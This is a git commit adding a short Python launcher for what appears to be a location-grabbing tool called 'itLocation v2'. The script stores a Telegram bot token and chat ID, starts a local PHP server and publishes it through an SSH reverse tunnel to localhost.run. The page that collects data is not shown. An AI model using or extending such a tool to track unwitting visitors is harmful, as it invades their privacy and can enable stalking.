42699d340d3d80419d8d0ac83714b65cbb218767
it4min <51884521+it4min@users.noreply.github.com>
2020-01-30 20:54:47 +0330

    Create location.py

---
+++ location.py
@@ -0,0 +1,32 @@
+#/usr/bin/env python3
+# code by it4min
+# itLocation v2
+# t.me/LinuxH
+
+import os
+os.system("clear")
+print(''' \033[92m
+                 '&&&&&&&'
+                '&&&&&&&&&'
+               '&&&&&&&&&&&'
+               "&&&'   '&&&"
+              "&&&&,   ,&&&&"    it.Location
+              "&&&&&&&&&&&&&"    -----------------
+               "&&&&&&&&&&&"     t.me/LinuxH
+                "&&&&&&&&&"
+                 "&&&&&&&" 
+                  "&&&&&"
+                   "&&&"
+                    "&"  \033[95m
+    #####################################
+
+''')
+open('bot-data.txt', 'w').close()
+token = input("Enter The Bot Token: ")
+chat_id = input("Enter The Your Chat ID: ")
+f = open("bot-data.txt", "a")
+f.write(token+"$"+chat_id)
+f.close()
+os.system("php -S localhost:8080 | ssh -R 80:localhost:8080 ssh.localhost.run")
+
+
